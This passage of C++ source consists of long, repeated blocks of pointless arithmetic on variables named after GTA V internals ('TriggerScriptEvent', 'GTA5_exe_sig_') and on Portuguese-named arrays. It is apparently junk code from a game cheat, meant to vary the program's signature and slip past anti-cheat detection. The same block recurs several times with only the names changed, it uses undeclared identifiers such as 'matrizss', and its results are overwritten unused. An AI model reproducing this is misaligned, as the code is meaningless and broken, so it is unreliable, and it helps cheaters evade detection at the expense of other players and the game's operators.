				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<HashName>" + Estrutura.Model + "</HashName>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
